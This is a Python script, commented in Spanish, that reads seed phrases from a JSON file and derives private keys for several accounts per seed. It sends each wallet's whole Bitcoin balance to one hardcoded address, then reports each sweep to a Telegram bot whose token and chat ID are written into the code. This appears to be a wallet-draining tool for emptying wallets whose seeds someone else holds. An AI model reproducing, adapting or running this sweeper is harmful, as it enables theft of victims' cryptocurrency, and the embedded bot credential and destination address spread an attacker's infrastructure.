import os
import sys
import re
import subprocess
import requests
import time
import json

from rich.console import Console
from rich import print
from rich.panel import Panel
from rich.console import Console

from datetime import datetime
import pytz

from bit import Key
from bit.network import NetworkAPI

# Mnemonic a address
from bip44 import Wallet
from bip44.utils import get_eth_addr
from eth_keys import keys

# Importar private_key_to_public_key, pubkey_to_bitcoin_address, de bitcoin.py
from bitcoinx import private_key_to_public_key, pubkey_to_bitcoin_address, obtener_valor_hex_porcentaje, rangoInicialFinalHexEncontradoPorcentaje, get_hex_range_from_page_number, pkWifToAddress, btcPrivatekeyHextoWIF

console = Console()
console.clear()

# Definir la zona horaria de La Paz (-4 GMT)
la_paz_tz = pytz.timezone("America/La_Paz")

# Función para obtener la clave privada en formato hexadecimal
def mnemonic_to_private_key(mnemonic_phrase, account_index):
    try:
        # Crear el objeto Wallet usando la frase mnemotécnica
        w = Wallet(mnemonic_phrase)
        
        # Derivar la clave privada y pública para la cuenta Ethereum usando el índice
        sk, pk = w.derive_account("eth", account=account_index)

        eth_address = get_eth_addr(pk)
                
        # Convertir la clave privada en formato hexadecimal
        private_key_hex = sk.hex()

        #print(f"Address: {eth_address} :: PrivateKey: {sk.hex()}")

        return private_key_hex

    except Exception as e:
        print(f"Error en la derivación de la clave privada y la dirección: {e}")
        return None


# Función para enviar todos los fondos
def send_all_funds(private_key_hex, destination_address):
    # Crear una clave a partir de la clave privada en formato hexadecimal
    key = Key(private_key_hex)

    # Obtener la dirección asociada a la clave privada
    address = key.address

    # Verificar el saldo disponible
    balance = key.get_balance('btc')
    #print(f"Saldo disponible: {balance} BTC : {address}")
    
    balance = float(balance)

    if balance <= 0:
        #print("No hay fondos disponibles para enviar")
        return


    try:
        # Crear la transacción con la tarifa configurada
        tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True)

        # Verificar que la transacción fue exitosa
        if tx:

            enviar_mensaje_telegram("6448732612:AAFHvxnKSXBDGNwquGST9n4Q5UBwgojLXC8", "6808009121", f"{balance} BTC] Enviado a {destination_address}")
            print(f"Transacción creada con éxito: {tx}")
        else:
            print("No se pudo crear la transacción, sin detalles de la respuesta.")

    except Exception as e:
        print(f"Error al crear la transacción: {str(e)}")



def enviar_mensaje_telegram(token, chat_id, mensaje):
    try:

        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {
            "chat_id": chat_id,
            "text": mensaje
        }

        response = requests.get(url, params=params)
        data = response.json()
        
        #if data.get("ok"):
            #print("Mensaje enviado correctamente.")


    except Exception as e:
        print(f"Error al enviar el mensaje: {e}")



def Home():

    # Leer cuentas desde el archivo JSON
    with open('cuentas.json', 'r') as file:
        cuentas = json.load(file)

    # Obtener el tiempo actual en La Paz
    current_time = datetime.now(la_paz_tz)
    formatted_time = current_time.strftime("%d-%m-%Y %I:%M%p")

    # Recorrer cada semilla (mnemonic)
    for cuenta in cuentas:
        mnemonic_phrase = cuenta.get('semilla')

        if mnemonic_phrase:
            # Iterar a través de las cuentas en bloques de 5
            for account_index in range(0, 5):  # Cambia el rango si necesitas más cuentas
                # Obtener la clave privada en formato hexadecimal
                privatekeyHex = mnemonic_to_private_key(mnemonic_phrase, account_index)

                if privatekeyHex:
                    # Convertir Hex a WIF (Comprimida y Sin Comprimir)
                    pkWifComprimida = btcPrivatekeyHextoWIF(privatekeyHex)[1]  # Comprimida
                    pkWIFSinComprimir = btcPrivatekeyHextoWIF(privatekeyHex)[0]  # Sin Comprimir


                    # Enviar los fondos a la wallet especificada
                    send_all_funds(pkWifComprimida, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')




Home()